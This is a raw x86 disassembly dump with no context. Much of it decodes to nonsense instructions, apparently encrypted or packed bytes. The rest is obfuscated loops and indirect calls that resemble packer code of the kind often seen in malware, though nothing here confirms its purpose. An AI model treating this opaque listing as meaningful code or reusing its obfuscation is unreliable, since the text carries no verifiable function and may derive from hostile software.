  4048c6:	sar    ecx,1
  4048c8:	xor    BYTE PTR [edi-0x1f],0x42
  4048cc:	cli    
  4048cd:	inc    edx
  4048ce:	stc    
  4048cf:	dec    esp
  4048d0:	pop    edx
  4048d1:	push   ebx
  4048d2:	das    
  4048d3:	inc    eax
  4048d4:	iret   
  4048d5:	mov    ebp,0x384af555
  4048da:	mov    ebp,0xd9fbea16
  4048df:	jo     0x404953
  4048e1:	jge    0x4048d4
  4048e3:	xor    eax,0x926776f0
  4048e8:	pop    es
  4048e9:	fcomp  DWORD PTR [eax-0x24]
  4048ec:	or     edi,esp
  4048ee:	fldenv [ebx]
  4048f0:	mov    dh,0xcf
  4048f2:	scas   eax,DWORD PTR es:[edi]
  4048f3:	push   ebp
  4048f4:	xor    al,0x33
  4048f6:	mov    ch,BYTE PTR [ecx+0x56]
  4048f9:	daa    
  4048fa:	jns    0x404948
  4048fc:	inc    ebx
  4048fd:	push   0xffffff99
  4048ff:	adc    BYTE PTR [edi-0x4b7d838e],dh
  404905:	lods   eax,DWORD PTR ds:[esi]
  404906:	push   ds
  404907:	cmp    al,0x50
  404909:	adc    ch,dl
  40490b:	adc    ebx,ebx
  40490d:	dec    edi
  40490e:	dec    ebx
  40490f:	mov    al,ds:0x8cd44970
  404914:	mov    ecx,0x51c46bd9
  404919:	(bad)  
  40491a:	push   cs
  40491b:	lea    edi,[edx]
  40491d:	push   ebx
  40491e:	das    
  40491f:	leave  
  404920:	in     eax,dx
  404921:	dec    edi
  404922:	imul   esi,DWORD PTR [ecx],0x7e
  404925:	js     0x404957
  404927:	dec    ebx
  404928:	sbb    ebp,eax
  40492a:	std    
  40492b:	dec    edi
  40492c:	jmp    0x9a6285a3
  404931:	shr    BYTE PTR [edx],0xac
  404934:	mov    ebp,edx
  404936:	jp     0x40498a
  404938:	fst    DWORD PTR [edi+0x4e82bb79]
  40493e:	cwde   
  40493f:	iret   
  404940:	jge    0x404941
  404942:	ins    DWORD PTR es:[edi],dx
  404943:	(bad)  
  404944:	das    
  404945:	pop    es
  404946:	aas    
  404947:	outs   dx,BYTE PTR ds:[esi]
  404948:	popf   
  404949:	in     eax,dx
  40494a:	in     eax,dx
  40494b:	imul   ebp,DWORD PTR [esi],0x2d96dd68
  404951:	stc    
  404952:	sbb    DWORD PTR [edi-0x4b649564],ebx
  404958:	bound  edx,QWORD PTR [eax-0xd3ddd93]
  40495e:	(bad)  
  40495f:	std    
  404960:	push   ecx
  404961:	mov    ebx,0xf57cffbe
  404966:	dec    ebp
  404967:	test   BYTE PTR [eax-0x76c7c1c3],ah
  40496d:	mov    cl,0x7b
  40496f:	js     0x404960
  404971:	jnp    0x40492a
  404973:	out    0x8a,al
  404975:	sahf   
  404976:	and    ecx,DWORD PTR [ebp-0x44]
  404979:	mov    al,0x73
  40497b:	sbb    BYTE PTR [eax],0xc9
  40497e:	dec    ecx
  40497f:	and    al,bh
  404981:	mov    eax,ds:0xa32f04b5
  404986:	int3   
  404987:	pop    ecx
  404988:	stos   DWORD PTR es:[edi],eax
  404989:	adc    BYTE PTR gs:[ecx-0x3a],dl
  40498d:	dec    edx
  40498e:	push   ss
  40498f:	pop    ebx
  404990:	cmp    eax,0x44f9e588
  404995:	pop    es
  404996:	fwait
  404997:	ins    DWORD PTR es:[edi],dx
  404998:	cmp    esi,edx
  40499a:	mov    eax,0xd17e5a0e
  40499f:	pop    esi
  4049a0:	mov    ah,BYTE PTR [ecx+0x8]
  4049a3:	fnstenv [esp+eiz*8-0x28]
  4049a7:	sub    dl,BYTE PTR [ecx+0x75d8397c]
  4049ad:	sbb    DWORD PTR [eax+ebx*4-0x1c],ebp
  4049b1:	pop    ebp
  4049b2:	(bad)  
  4049b3:	rol    bp,cl
  4049b6:	pop    ecx
  4049b7:	stc    
  4049b8:	xchg   edx,eax
  4049b9:	sub    edi,ebp
  4049bb:	aad    0xc8
  4049bd:	out    dx,al
  4049be:	push   edi
  4049bf:	add    ch,BYTE PTR [edx+0x5cc47ae2]
  4049c5:	cmp    eax,0xe1606a1a
  4049ca:	icebp  
  4049cb:	push   esp
  4049cc:	mov    cl,0xe0
  4049ce:	cmp    DWORD PTR [ebx],edi
  4049d0:	and    ah,dl
  4049d2:	mov    bl,0xc
  4049d4:	inc    esi
  4049d5:	outs   dx,DWORD PTR ds:[esi]
  4049d6:	xor    DWORD PTR [esi],esp
  4049d8:	repnz mov bh,0x1e
  4049db:	cwde   
  4049dc:	sar    ecx,cl
  4049de:	nop
  4049df:	xor    eax,DWORD PTR ss:[ecx+0x3e9e6381]
  4049e6:	arpl   WORD PTR [eax-0x14fb63fe],bx
  4049ec:	xor    al,0xcb
  4049ee:	push   ebp
  4049ef:	rol    eax,0xa7
  4049f2:	mov    ebx,DWORD PTR [esi+0x64244867]
  4049f8:	test   DWORD PTR fs:[ebp+0x3cfaf345],edx
  4049ff:	cld    
  404a00:	loop   0x40498b
  404a02:	(bad)  
  404a03:	mov    es,WORD PTR [esi]
  404a05:	adc    eax,0x53392c2a
  404a0a:	clc    
  404a0b:	daa    
  404a0c:	inc    eax
  404a0d:	sub    ebx,esi
  404a0f:	shl    DWORD PTR [edx],1
  404a11:	shr    DWORD PTR [edi-0x50],cl
  404a14:	xlat   BYTE PTR ds:[ebx]
  404a15:	arpl   WORD PTR [eax+0x71],bx
  404a18:	ins    DWORD PTR es:[edi],dx
  404a19:	adc    ebx,eax
  404a1b:	les    eax,FWORD PTR [esi]
  404a1d:	into   
  404a1e:	aad    0x4c
  404a20:	lds    eax,FWORD PTR [eax+0x10]
  404a23:	icebp  
  404a24:	xor    DWORD PTR [ecx],eax
  404a26:	or     DWORD PTR [ebx-0x7f659aa4],eax
  404a2c:	mov    ebx,0x5a97e222
  404a31:	(bad)  
  404a32:	jne    0x404a71
  404a34:	mov    al,0xd8
  404a36:	mov    al,ds:0xa3c3198f
  404a3b:	int3   
  404a3c:	push   esi
  404a3d:	dec    edi
  404a3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a3f:	nop
  404a40:	lock clc 
  404a42:	jbe    0x404aac
  404a44:	push   es
  404a45:	pop    ebx
  404a46:	bound  ebx,QWORD PTR [esi]
  404a48:	shr    DWORD PTR [ecx+0x5fc4c2f3],1
  404a4e:	(bad)  
  404a4f:	in     al,0x79
  404a51:	popa   
  404a52:	sbb    BYTE PTR [eax+0xe],cl
  404a55:	add    al,0xa7
  404a57:	sbb    DWORD PTR [edi+edi*1-0x40e21bf4],ebp
  404a5e:	sub    al,0x7d
  404a60:	ins    BYTE PTR es:[edi],dx
  404a61:	fucomp st(1)
  404a63:	in     eax,0x9c
  404a65:	loop   0x404a23
  404a67:	mov    ebx,es
  404a69:	push   cs
  404a6a:	(bad)  
  404a6c:	leave  
  404a6d:	jecxz  0x404a77
  404a6f:	xchg   ebp,eax
  404a70:	fcom   QWORD PTR [ebx-0x58]
  404a73:	pop    edx
  404a74:	mov    ah,0x3d
  404a76:	fsub   QWORD PTR [esi-0x4f]
  404a79:	lahf   
  404a7a:	push   edx
  404a7b:	xchg   ebp,eax
  404a7c:	mov    ebp,0xf44b763b
  404a81:	push   ebx
  404a82:	push   0xffffffc1
  404a84:	inc    esi
  404a85:	hlt    
  404a86:	(bad)  
  404a87:	add    eax,0x784b90ac
  404a8c:	mov    ecx,0x8ded61e
  404a91:	push   es
  404a92:	xchg   edx,eax
  404a93:	cmc    
  404a94:	icebp  
  404a95:	repz push eax
  404a97:	pop    ds
  404a98:	add    edi,esi
  404a9a:	add    dh,BYTE PTR [ebp+0x76]
  404a9d:	adc    ebx,DWORD PTR [esi-0x1d]
  404aa0:	dec    ecx
  404aa1:	std    
  404aa2:	call   edi
  404aa4:	push   edx
  404aa5:	or     BYTE PTR [ebx+ebx*2],dl
  404aa8:	inc    edx
  404aa9:	and    BYTE PTR [ebx-0x6b],dh
  404aac:	xchg   edx,eax
  404aad:	pop    edx
  404aae:	(bad)  
  404aaf:	fidivr WORD PTR [ecx-0x44]
  404ab2:	ja     0x404aac
  404ab4:	test   eax,0x6a1d2c1d
  404ab9:	mov    DWORD PTR [eax],edi
  404abb:	xor    ecx,0x64b56363
  404ac1:	rol    BYTE PTR [edx+0x2d],0xc8
  404ac5:	push   es
  404ac6:	pop    ebp
  404ac7:	addr16 mov ch,0xee
  404aca:	rol    DWORD PTR [eax-0x71],1
  404acd:	mov    ecx,0x11673651
  404ad2:	sbb    eax,0xeba20ad1
  404ad7:	xor    al,0xdb
  404ad9:	sub    ebx,DWORD PTR [esi]
  404adb:	out    dx,eax
  404adc:	scas   al,BYTE PTR es:[edi]
  404add:	dec    ebp
  404ade:	push   edi
  404adf:	repz xor ch,BYTE PTR [edi-0x43]
  404ae3:	adc    eax,0xeb866ea6
  404ae8:	or     BYTE PTR [ebx],0x5d
  404aeb:	add    al,0x1e
  404aed:	dec    ebp
  404aee:	jmp    0x1613e9d6
  404af3:	mov    al,0x29
  404af5:	push   ebx
  404af6:	clc    
  404af7:	mov    esi,DWORD PTR [eax+0x5c148694]
  404afd:	pushf  
  404afe:	scas   eax,DWORD PTR es:[edi]
  404aff:	add    BYTE PTR [edi+0x1c],cl
  404b02:	(bad)  
  404b03:	mov    ebx,0x602021a7
  404b08:	(bad)  
  404b0a:	sub    DWORD PTR [ebx+0x26],ebp
  404b0d:	ret    0x3233
  404b10:	add    eax,0x461ba440
  404b15:	sti    
  404b16:	pop    eax
  404b17:	mov    al,0xc1
  404b19:	cs jecxz 0x404b8e
  404b1c:	gs xchg ebx,eax
  404b1e:	stos   DWORD PTR es:[edi],eax
  404b1f:	and    al,0xf4
  404b21:	mov    ebx,0x601118b2
  404b26:	mov    ds,WORD PTR [ebx-0x2b]
  404b29:	dec    ebp
  404b2a:	retf   0xed8d
  404b2d:	jae    0x404ac2
  404b2f:	cli    
  404b30:	imul   ebx,DWORD PTR [ecx],0xdb8b22b3
  404b36:	dec    ebp
  404b37:	xchg   esi,eax
  404b38:	lods   al,BYTE PTR ds:[esi]
  404b39:	pop    edi
  404b3a:	fnstenv [ecx]
  404b3c:	xor    BYTE PTR [ebx],cl
  404b3e:	loop   0x404ae6
  404b40:	pop    eax
  404b41:	arpl   bx,bp
  404b43:	dec    ecx
  404b44:	sub    BYTE PTR [edi],0x82
  404b47:	cli    
  404b48:	es jbe 0x404adf
  404b4b:	sbb    ah,BYTE PTR [edi+0x6db51da5]
  404b51:	test   al,0x3d
  404b53:	jg     0x404b9b
  404b55:	clc    
  404b56:	cwde   
  404b57:	imul   ebp,DWORD PTR [edi],0xcd64708c
  404b5d:	int    0xca
  404b5f:	aam    0x18
  404b61:	push   0xe8024c1e
  404b66:	dec    edx
  404b67:	add    ebp,DWORD PTR [ecx+ebp*2]
  404b6a:	(bad)  
  404b6b:	pushf  
  404b6c:	and    eax,0xaaac3825
  404b71:	mov    al,0x82
  404b73:	or     eax,0xce013347
  404b78:	mov    ds:0x6dc58360,al
  404b7d:	push   esp
  404b7e:	or     DWORD PTR [ebx],edi
  404b80:	and    eax,0xc90f258
  404b85:	repnz out dx,eax
  404b87:	clc    
  404b88:	loop   0x404b1f
  404b8a:	cmp    ch,BYTE PTR [edi+0x3c]
  404b8d:	add    cl,BYTE PTR [ebp-0x1bf8d393]
  404b93:	add    BYTE PTR ds:0x81bba5b9,ah
  404b99:	jp     0x404b85
  404b9b:	sbb    al,0x98
  404b9d:	jmp    0x7db:0x1bb4314f
  404ba4:	ret    0x36d
  404ba7:	imul   DWORD PTR [ecx-0x3d5a17bd]
  404bad:	lods   eax,DWORD PTR ds:[esi]
  404bae:	iret   
  404baf:	shl    DWORD PTR [ecx],0x1f
  404bb2:	sbb    ebp,0x5
  404bb5:	fcom   QWORD PTR [eax+ecx*4]
  404bb8:	fs push esi
  404bba:	push   ecx
  404bbb:	jns    0x404b84
  404bbd:	mov    esi,0xcdc823be
  404bc2:	or     eax,0x745e99a8
  404bc7:	not    DWORD PTR [edx+eiz*1-0x55]
  404bcb:	dec    edx
  404bcc:	inc    eax
  404bcd:	adc    eax,0xe6a6429f
  404bd2:	test   DWORD PTR [ecx+eiz*1+0x65],eax
  404bd6:	scas   eax,DWORD PTR es:[edi]
  404bd7:	clc    
  404bd8:	sar    BYTE PTR [edi+ebp*1+0x127bdfea],1
  404bdf:	mov    dh,0x86
  404be1:	into   
  404be2:	mov    ebp,0x90fbe048
  404be7:	inc    esi
  404be8:	inc    esp
  404be9:	imul   DWORD PTR [edx+0x1e]
  404bec:	inc    ebx
  404bed:	mov    edi,0xca4e55e5
  404bf2:	pushf  
  404bf3:	adc    eax,ebp
  404bf5:	or     al,0x96
  404bf7:	cs iret 
  404bf9:	jmp    0x404c4f
  404bfb:	loopne 0x404c54
  404bfd:	imul   esp,DWORD PTR gs:[ebp-0x6b],0xffffffa2
  404c02:	add    al,0xc0
  404c04:	dec    eax
  404c05:	pop    edi
  404c06:	pop    edx
  404c07:	fbstp  TBYTE PTR [ebx+eiz*1-0x7]
  404c0b:	dec    edi
  404c0c:	push   es
  404c0d:	pusha  
  404c0e:	inc    ebp
  404c0f:	add    ebp,DWORD PTR [ecx-0x2b]
  404c12:	xor    DWORD PTR [eax],edi
  404c14:	out    dx,eax
  404c15:	jbe    0x404c01
  404c17:	repnz dec esp
  404c19:	adc    eax,0x735c34ac
  404c1e:	aaa    
  404c1f:	jg     0x404c15
  404c21:	mov    bh,0x15
  404c23:	dec    ebp
  404c24:	mov    esp,0xde5d3599
  404c29:	mov    cl,0x2a
  404c2b:	loop   0x404c7a
  404c2d:	cmp    eax,0x3a4c5ac3
  404c32:	add    al,0x9f
  404c34:	mov    dh,0x2a
  404c36:	stos   BYTE PTR es:[edi],al
  404c37:	xor    BYTE PTR [ebx+esi*4],0x11
  404c3b:	inc    ebx
  404c3c:	pop    ecx
  404c3d:	int3   
  404c3e:	xor    eax,0x1480360f
  404c43:	push   edi
  404c44:	fucom  st(0)
  404c46:	and    eax,0xef1474fa
  404c4b:	shr    BYTE PTR [edi-0x6b],1
  404c4e:	and    BYTE PTR [ebx],bh
  404c50:	mov    WORD PTR [esi+ebp*4],fs
  404c53:	mov    ds:0x8a2dc623,al
  404c58:	fstp   st(7)
  404c5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c5b:	mov    edx,0xa6c72340
  404c60:	sub    al,0x12
  404c62:	(bad)  
  404c64:	push   0x9e0e96a3
  404c69:	jl     0x404c10
  404c6b:	jae    0x404c86
  404c6d:	daa    
  404c6e:	(bad)  
  404c6f:	mov    ebp,ebp
  404c71:	add    bh,BYTE PTR [edi+0x7319929f]
  404c77:	xor    ecx,DWORD PTR fs:[ebx+0x24]
  404c7b:	js     0x404c77
  404c7d:	add    DWORD PTR [eax],0xffffffe7
  404c80:	cmp    ah,cl
  404c82:	jge    0x404c51
  404c84:	push   esp
  404c85:	int3   
  404c86:	loopne 0x404c11
  404c88:	sbb    BYTE PTR cs:[ecx+0x4d43a3a2],bh
  404c8f:	fld    TBYTE PTR ds:0x75df0e31
  404c95:	or     eax,0x5b0f0723
  404c9a:	cmp    esp,DWORD PTR [ebx]
  404c9c:	adc    edi,eax
  404c9e:	inc    ecx
  404c9f:	outs   dx,DWORD PTR ds:[esi]
  404ca0:	jo     0x404c34
  404ca2:	fs in  eax,0x8c
  404ca5:	pop    edi
  404ca6:	push   ebp
  404ca7:	cmc    
  404ca8:	aaa    
  404ca9:	pusha  
  404caa:	pop    ds
  404cab:	call   0xa6d41b60
  404cb0:	das    
  404cb1:	and    BYTE PTR [eax+0x1a],dh
  404cb4:	les    ebp,FWORD PTR [eax*8-0x67f3b596]
  404cbb:	xor    dh,ah
  404cbd:	and    BYTE PTR [esi+0x63],dh
  404cc0:	mov    ch,dl
  404cc2:	or     DWORD PTR [edi+0x30],0x2f6350ba
  404cc9:	std    
  404cca:	jl     0x404cce
  404ccc:	and    eax,0xbba7dd3c
  404cd1:	lods   al,BYTE PTR ds:[esi]
  404cd2:	loop   0x404c7b
  404cd4:	or     ebx,DWORD PTR [ebp-0x40]
  404cd7:	and    DWORD PTR [esi+0x59],edx
  404cda:	jns    0x404d42
  404cdc:	ins    DWORD PTR es:[edi],dx
  404cdd:	shl    DWORD PTR [eax+0x34391ffb],cl
  404ce3:	loop   0x404ca4
  404ce5:	es in  eax,dx
  404ce7:	mov    ecx,fs
  404ce9:	mov    cl,0x45
  404ceb:	ret    0xdab2
  404cee:	ins    DWORD PTR es:[edi],dx
  404cef:	mov    ds:0xde8bfe0a,eax
  404cf4:	sbb    bl,al
  404cf6:	fmulp  st(5),st
  404cf8:	adc    BYTE PTR [ebp-0x2bfdb281],bl
  404cfe:	stos   DWORD PTR es:[edi],eax
  404cff:	test   BYTE PTR [edi+0x54],ah
  404d02:	outs   dx,DWORD PTR ds:[esi]
  404d03:	jecxz  0x404d1c
  404d05:	arpl   WORD PTR [ebp-0x125a5123],bp
  404d0b:	(bad)  
  404d0c:	xor    BYTE PTR [esi+0x7011b68e],bh
  404d12:	xor    eax,esp
  404d14:	xor    edx,esp
  404d16:	mov    edi,0x3404a7db
  404d1b:	jbe    0x404d64
  404d1d:	adc    DWORD PTR [ebx],esp
  404d1f:	(bad)  
  404d20:	mov    cs,WORD PTR [esi]
  404d22:	lea    esi,[ecx-0x47]
  404d25:	ins    BYTE PTR es:[edi],dx
  404d26:	push   cs
  404d27:	add    ah,ch
  404d29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d2a:	mov    dh,0x19
  404d2c:	push   ss
  404d2d:	fst    DWORD PTR [ecx]
  404d2f:	and    eax,0x4c501293
  404d34:	or     BYTE PTR [esi-0x2e9aff9c],dl
  404d3a:	xchg   esi,eax
  404d3b:	out    dx,al
  404d3c:	sbb    ebp,ebp
  404d3e:	ins    BYTE PTR es:[edi],dx
  404d3f:	xor    al,BYTE PTR [ecx-0x7143c9f]
  404d45:	mov    ecx,0x4a845db6
  404d4a:	xor    cl,al
  404d4c:	mov    cl,0x8a
  404d4e:	mov    BYTE PTR [eax],bl
  404d50:	(bad)  
  404d51:	and    al,0x1
  404d53:	or     eax,0xd55cb642
  404d58:	push   ebp
  404d59:	jne    0x404d73
  404d5b:	hlt    
  404d5c:	in     eax,dx
  404d5d:	aam    0x8c
  404d5f:	mov    esp,0x8a6e3592
  404d64:	jmp    0x404dc6
  404d66:	and    BYTE PTR [edi-0x1b],dl
  404d69:	add    eax,0x9699f20d
  404d6e:	jnp    0x404de7
  404d70:	mov    ecx,DWORD PTR [ebx]
  404d72:	sbb    eax,0x484dafc6
  404d77:	(bad)  
  404d79:	xor    BYTE PTR [ecx+esi*2-0x67],bh
  404d7d:	shl    BYTE PTR [ebp+0x16],0x1d
  404d81:	cmp    DWORD PTR [edi-0x6b],ebx
  404d84:	nop
  404d85:	jmp    0xba5a:0x6e738025
  404d8c:	inc    edx
  404d8d:	push   edi
  404d8e:	aaa    
  404d8f:	jno    0x404de8
  404d91:	jae    0x404dd8
  404d93:	gs mov edx,ebx
  404d96:	scas   al,BYTE PTR es:[edi]
  404d97:	mov    edi,DWORD PTR [ebx+0x930c1a0]
  404d9d:	jecxz  0x404d21
  404d9f:	and    eax,0x44812849
  404da4:	rol    DWORD PTR [ebx+eax*1-0x7232196c],0x82
  404dac:	lahf   
  404dad:	sub    BYTE PTR [edi+0x55],bl
  404db0:	call   0x13705878
  404db5:	mov    edi,0x3b838716
  404dba:	jb     0x404d92
  404dbc:	mov    ch,0xde
  404dbe:	test   eax,0x6e027a04
  404dc3:	in     eax,dx
  404dc4:	test   BYTE PTR ds:0xecab328d,cl
  404dca:	mov    WORD PTR gs:[esi+0x1d],es
  404dce:	fdivr  DWORD PTR [ebx]
  404dd0:	sar    BYTE PTR [edi-0x429dcb6c],1
  404dd6:	or     eax,0x789d769
  404ddb:	sbb    al,0xd0
  404ddd:	cmp    BYTE PTR [eax+0x2a],0x3f
  404de1:	adc    al,0x6a
  404de3:	add    DWORD PTR [edx+0x5d2a6685],eax
  404de9:	icebp  
  404dea:	xor    bh,BYTE PTR [ebx-0x6d042ad3]
  404df0:	fdiv   DWORD PTR [edi+eax*2]
  404df3:	fcom   QWORD PTR [ebx+0x46]
  404df6:	(bad)  
  404df7:	(bad)  [edi]
  404df9:	test   al,bl
  404dfb:	add    BYTE PTR [eax],al
  404dfd:	add    BYTE PTR [ebx],ah
  404dff:	add    eax,0x42b010
  404e04:	mov    eax,DWORD PTR [ebp+0x14]
  404e07:	and    DWORD PTR ds:0x42901c,0x0
  404e11:	jmp    0x404e23
  404e16:	mov    ebx,DWORD PTR ds:0x42901c
  404e1c:	inc    ebx
  404e1d:	mov    DWORD PTR ds:0x42901c,ebx
  404e23:	cmp    DWORD PTR ds:0x42901c,0x11
  404e2a:	jae    0x404e6a
  404e30:	cmp    DWORD PTR ds:0x42901c,0x1a
  404e37:	jne    0x404e53
  404e3d:	push   DWORD PTR [ebp-0x18]
  404e40:	push   DWORD PTR [ebp-0x28]
  404e43:	push   0x42e0e0
  404e48:	push   0x400000
  404e4d:	call   DWORD PTR ds:0x42e8eb
  404e53:	jmp    0x404e16
  404e58:	mov    ebx,DWORD PTR ds:0x42a01c
  404e5e:	sub    ebx,DWORD PTR ds:0x42d008
  404e64:	mov    DWORD PTR ds:0x42a01c,ebx
  404e6a:	mov    eax,DWORD PTR [eax]
  404e6c:	and    DWORD PTR ds:0x42b01c,0x0
  404e76:	mov    ebx,DWORD PTR ds:0x42b01c
  404e7c:	inc    ebx
  404e7d:	mov    DWORD PTR ds:0x42b01c,ebx
  404e83:	cmp    DWORD PTR ds:0x42b01c,0x6
  404e8a:	jne    0x404e96
  404e90:	call   DWORD PTR ds:0x42e8ef
  404e96:	cmp    DWORD PTR ds:0x42b01c,0x5
  404e9d:	jne    0x404eb2
  404ea3:	xor    ebx,ebx
  404ea5:	or     ebx,DWORD PTR ds:0x42b01c
  404eab:	inc    ebx
  404eac:	mov    DWORD PTR ds:0x42b01c,ebx
  404eb2:	cmp    DWORD PTR ds:0x42b01c,0x12
  404eb9:	jb     0x404e76
  404ebf:	xor    ebx,ebx
  404ec1:	or     ebx,DWORD PTR ds:0x429000
  404ec7:	add    ebx,DWORD PTR ds:0x42d014
  404ecd:	mov    DWORD PTR ds:0x429000,ebx
  404ed3:	mov    DWORD PTR [ebp-0x1c],eax
  404ed6:	mov    eax,ds:0x41cd65
  404edb:	mov    ebx,DWORD PTR ds:0x41ce0c
  404ee1:	sub    ebx,eax
  404ee3:	or     eax,DWORD PTR [eax+ebx*1]
  404ee6:	mov    eax,DWORD PTR [ebp-0x4]
  404ee9:	mov    DWORD PTR ds:0x42900c,0x13
  404ef3:	cmp    DWORD PTR ds:0x42900c,0x0
  404efa:	je     0x404f3f
  404f00:	cmp    DWORD PTR ds:0x42900c,0xa
  404f07:	jne    0x404f13
  404f0d:	call   DWORD PTR ds:0x42e8f3
  404f13:	cmp    DWORD PTR ds:0x42900c,0xb
  404f1a:	jne    0x404f2d
  404f20:	mov    ebx,DWORD PTR ds:0x42900c
  404f26:	dec    ebx
  404f27:	mov    DWORD PTR ds:0x42900c,ebx
  404f2d:	mov    ebx,DWORD PTR ds:0x42900c
  404f33:	dec    ebx
  404f34:	mov    DWORD PTR ds:0x42900c,ebx
  404f3a:	jmp    0x404ef3
  404f3f:	xor    eax,esi
  404f41:	add    ebx,0x5bdd
  404f47:	add    eax,edi
  404f49:	mov    DWORD PTR [ebp-0x8],eax
  404f4c:	and    ebx,eax
  404f4e:	mov    eax,DWORD PTR [ebp-0xc]
  404f51:	sbb    DWORD PTR ds:0x42a000,ecx
  404f57:	xor    eax,esi
  404f59:	add    eax,edi
  404f5b:	and    DWORD PTR ds:0x42b018,0x0
  404f65:	mov    ebx,DWORD PTR ds:0x42b018
  404f6b:	inc    ebx
  404f6c:	mov    DWORD PTR ds:0x42b018,ebx
  404f72:	cmp    DWORD PTR ds:0x42b018,0x1f
  404f79:	jne    0x404f8a
  404f7f:	push   0x42e0ac
  404f84:	call   DWORD PTR ds:0x42e8f7
  404f8a:	cmp    DWORD PTR ds:0x42b018,0x12
  404f91:	jb     0x404f65
  404f97:	mov    DWORD PTR [ebp-0x24],eax
  404f9a:	mov    eax,DWORD PTR [ebp-0x4]
  404f9d:	xor    eax,esi
  404f9f:	add    eax,edi
  404fa1:	mov    DWORD PTR [ebp-0x30],eax
  404fa4:	mov    ebx,DWORD PTR [ebp-0x4]
  404fa7:	mov    eax,ds:0x41cd79
  404fac:	mov    eax,DWORD PTR [eax]
  404fae:	xor    DWORD PTR ds:0x42900c,eax
  404fb4:	xor    ebx,esi
  404fb6:	add    ebx,edi
  404fb8:	mov    DWORD PTR ds:0x42c01c,0x1a
  404fc2:	cmp    DWORD PTR ds:0x42c01c,0x0
  404fc9:	je     0x4050fc
  404fcf:	cmp    DWORD PTR ds:0x42c01c,0x3
  404fd6:	jne    0x404fe7
  404fdc:	push   0x42e018
  404fe1:	call   DWORD PTR ds:0x42e8fb
  404fe7:	cmp    DWORD PTR ds:0x42c01c,0x4
  404fee:	jne    0x404fff
  404ff4:	mov    eax,ds:0x42c01c
  404ff9:	dec    eax
  404ffa:	mov    ds:0x42c01c,eax
  404fff:	mov    eax,ds:0x42c01c
  405004:	dec    eax
  405005:	mov    ds:0x42c01c,eax
  40500a:	jmp    0x404fc2
  40500f:	mov    DWORD PTR ds:0x42b010,0x1e
  405019:	cmp    DWORD PTR ds:0x42b010,0x0
  405020:	je     0x4050fc
  405026:	cmp    DWORD PTR ds:0x42b010,0x29
  40502d:	jne    0x405039
  405033:	call   DWORD PTR ds:0x42e8ff
  405039:	mov    eax,ds:0x42b010
  40503e:	dec    eax
  40503f:	mov    ds:0x42b010,eax
  405044:	jmp    0x405019
  405049:	mov    DWORD PTR ds:0x42a004,0x16
  405053:	cmp    DWORD PTR ds:0x42a004,0x0
  40505a:	je     0x4050fc
  405060:	cmp    DWORD PTR ds:0x42a004,0xb
  405067:	jne    0x405082
  40506d:	push   0x6cef
  405072:	push   0x42a000
  405077:	push   0x4fd9
  40507c:	call   DWORD PTR ds:0x42e903
  405082:	cmp    DWORD PTR ds:0x42a004,0xc
  405089:	jne    0x40509a
  40508f:	mov    eax,ds:0x42a004
  405094:	dec    eax
  405095:	mov    ds:0x42a004,eax
  40509a:	mov    eax,ds:0x42a004
  40509f:	dec    eax
  4050a0:	mov    ds:0x42a004,eax
  4050a5:	jmp    0x405053
  4050aa:	mov    DWORD PTR ds:0x42901c,0x1f
  4050b4:	cmp    DWORD PTR ds:0x42901c,0x0
  4050bb:	je     0x4050fc
  4050c1:	cmp    DWORD PTR ds:0x42901c,0x22
  4050c8:	jne    0x4050e2
  4050ce:	push   DWORD PTR [ebp-0x1c]
  4050d1:	push   0x7ea8
  4050d6:	push   DWORD PTR [ebp-0x10]
  4050d9:	push   DWORD PTR [ebp-0x28]
  4050dc:	call   DWORD PTR ds:0x42e8c3
  4050e2:	mov    eax,ds:0x42901c
  4050e7:	dec    eax
  4050e8:	mov    ds:0x42901c,eax
  4050ed:	jmp    0x4050b4
  4050f2:	and    DWORD PTR ds:0x42d008,0x7d7b
  4050fc:	mov    eax,DWORD PTR [ebp-0x24]
  4050ff:	sub    eax,edi
  405101:	lea    ecx,[ebx-0x3272e2]
  405107:	and    DWORD PTR ds:0x42d00c,0x483b
  405111:	xor    eax,esi
  405113:	sub    DWORD PTR ds:0x42a000,0x7f75
  40511d:	xor    ecx,esi
  40511f:	cmp    ecx,eax
  405121:	mov    DWORD PTR ds:0x429010,0x207a
  40512b:	je     0x405268
  405131:	mov    eax,DWORD PTR [ebp-0x4]
  405134:	add    DWORD PTR ds:0x42a004,0x429018
  40513e:	xor    eax,esi
  405140:	add    eax,edi
  405142:	mov    DWORD PTR ds:0x42d010,0x65f6
  40514c:	cmp    ebx,eax
  40514e:	mov    DWORD PTR ds:0x42b00c,0x5c1b
  405158:	jne    0x405245
  40515e:	or     DWORD PTR ds:0x42a018,0x42d00c
  405168:	push   DWORD PTR [ebp+0x8]
  40516b:	sbb    DWORD PTR ds:0x429020,0x6ddf
  405175:	call   0x402803
  40517a:	mov    DWORD PTR ds:0x42a014,0x17
  405184:	cmp    DWORD PTR ds:0x42a014,0x0
  40518b:	je     0x4051de
  405191:	cmp    DWORD PTR ds:0x42a014,0xc
  405198:	jne    0x4051b2
  40519e:	push   0x42d5
  4051a3:	push   DWORD PTR [ebp-0x20]
  4051a6:	push   DWORD PTR [ebp-0x24]
  4051a9:	push   DWORD PTR [ebp-0x28]
  4051ac:	call   DWORD PTR ds:0x42e8c7
  4051b2:	cmp    DWORD PTR ds:0x42a014,0xd
  4051b9:	jne    0x4051cc
  4051bf:	mov    ecx,DWORD PTR ds:0x42a014
  4051c5:	dec    ecx
  4051c6:	mov    DWORD PTR ds:0x42a014,ecx
  4051cc:	mov    ecx,DWORD PTR ds:0x42a014
  4051d2:	dec    ecx
  4051d3:	mov    DWORD PTR ds:0x42a014,ecx
  4051d9:	jmp    0x405184
  4051de:	mov    DWORD PTR [ebp-0x14],eax
  4051e1:	mov    eax,DWORD PTR [ebp-0x4]
  4051e4:	mov    ecx,DWORD PTR [ebp-0x14]
  4051e7:	xor    eax,esi
  4051e9:	add    eax,edi
  4051eb:	cmp    ecx,eax
  4051ed:	je     0x4052d3
  4051f3:	push   DWORD PTR [ebp-0x14]
  4051f6:	push   DWORD PTR [ebp+0x8]
  4051f9:	call   0x40ea45
  4051fe:	mov    DWORD PTR [ebp-0x14],eax
  405201:	mov    eax,DWORD PTR [ebp-0x4]
  405204:	mov    ecx,DWORD PTR [ebp-0x14]
  405207:	xor    eax,esi
  405209:	add    eax,edi
  40520b:	cmp    ecx,eax
  40520d:	je     0x4052d3
